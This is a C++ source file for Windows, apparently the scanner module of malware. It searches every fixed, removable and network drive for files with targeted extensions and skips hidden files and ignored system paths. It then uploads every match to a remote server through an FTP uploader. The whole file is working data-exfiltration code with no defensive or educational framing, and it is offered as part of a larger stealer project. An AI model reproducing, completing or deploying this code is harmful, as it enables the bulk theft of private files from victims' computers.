#include "common.h"
#include <windows.h>
#include "scanner.h"
#include "packets.h"
#include "ftp_uploader.h"
#include <assert.h>
#include "hwid.h"
#include "..\Common\md5_lib_src.h"

int get_system_drives(std::vector<char>& drives)
{
#ifdef _DEBUG
	printf("get_system_drives() called!\r\n");
	drives.push_back('C');
	return 1;
#endif // _DEBUG
	char buf[4];

	int found_drives = 0;
	for (char i = 'A'; i != 'Z'; i++)
	{
		sprintf(buf, "%c:\\", i);
		switch (GetDriveType(buf))
		{
			case DRIVE_UNKNOWN:
			case DRIVE_NO_ROOT_DIR:
			case DRIVE_RAMDISK:
			case DRIVE_CDROM:
				continue;

			case DRIVE_REMOVABLE:
			case DRIVE_FIXED:
			case DRIVE_REMOTE:
				drives.push_back(i);
				found_drives++;
				break;
		}
	}
	return found_drives;
}


bool is_sensible_file(const char* file)
{

	for (auto& entry : sensible_file_extension)
	{
		bool match = false;
		for (int i = 0; i < 4; i++)
		{
			if (strlen(file) < entry.size())
				continue;

			bool c_match = true;
			for (int j = 0; j < entry.size(); j++)
			{
				if (file[strlen(file) - 1 - j] != toupper(entry[entry.size() - 1 - j])
					&& file[strlen(file) - 1 - j] != tolower(entry[entry.size() - 1 - j]))
				{
					c_match = false;
					break;
				}

			}
			if (c_match)
				return true;
		}
	}
	return false;
}

bool is_ignored_path(char* path)
{
	if (strlen(path) < 5)
		return false;



	for (auto& entry : ignored_paths)
	{
		bool match = true;
		for (int j = 0; j < entry.size(); j++)
		{
			if (entry[j] != tolower(path[j]) && entry[j] != toupper(path[j]))
			{
				match = false;
				break;
			}
		}
		if (match)
			return true;
	}

	return false;
}

int get_sensible_files_paths(std::vector<std::string>& data)
{
#ifdef _DEBUG
	printf("get_sensible_files_paths() called!\r\n");
#endif // _DEBUG

	std::vector<char> drives;
	int drives_count = get_system_drives(drives);

	for (int i = 0; i < drives_count; i++)
	{
		char drive_buffer[10];
		char path_buffer[10];
		sprintf(drive_buffer, "%c:\\", drives[i]);

		int found_files = get_sensible_files_paths(drive_buffer, data);
		
	}

	return 0;
}

#ifdef max
#undef max
#endif

char tmp_file_data[sizeof(unsigned long long)];
int get_sensible_files_paths(char* dir, std::vector<std::string>& data)
{
	int files_found = 0;

	char path_buffer[MAX_PATH];
	strcpy(path_buffer, dir);
	strcat(path_buffer, "*");

	WIN32_FIND_DATA w32_find_data;
	HANDLE file_handler = FindFirstFile(path_buffer, &w32_find_data);
	if (!file_handler || file_handler == INVALID_HANDLE_VALUE)
		return 0;


	do
	{
		if (w32_find_data.dwFileAttributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY))
			continue;
		else if (w32_find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (!w32_find_data.cFileName[0] || w32_find_data.cFileName[0] == '.' || is_ignored_path(w32_find_data.cFileName))
				continue;

			char new_path_buffer[MAX_PATH];
			sprintf(new_path_buffer, "%s%s\\", dir, w32_find_data.cFileName);
			files_found += get_sensible_files_paths(new_path_buffer, data);
		}
		else if (is_sensible_file(w32_find_data.cFileName))
		{


			char file_full_path[MAX_PATH];
			sprintf(file_full_path, "%s%s", dir, w32_find_data.cFileName);


			data.push_back(std::string(file_full_path));
			files_found++;

		}
	} while (FindNextFile(file_handler, &w32_find_data));

	return files_found;
}

void init_scanner()
{
#ifdef ENABLE_PRINTF
	printf("Called scanner_init!\r\n");
#endif // ENABLE_PRINTF


#ifdef ENABLE_PRINTF
	printf("Searching sensible files...\r\n");
#endif // ENABLE_PRINTF

	std::vector<std::string> sensible_file_list;
	get_sensible_files_paths(sensible_file_list);

#ifdef ENABLE_PRINTF
	printf("Files found: %d\r\n", sensible_file_list.size());
#endif // ENABLE_PRINTF

#ifdef ENABLE_PRINTF
	int s = 0;
	printf("\r\n\r\n\tQueued Files: %d/%d\r", s, sensible_file_list.size());
#endif // ENABLE_PRINTF


	for (auto& entry : sensible_file_list)
	{
		ftp_upload_file((char*)entry.c_str());

#ifdef ENABLE_PRINTF
		printf("\tQueued Files: %d/%d\r", ++s, sensible_file_list.size());
#endif // ENABLE_PRINTF

	}

}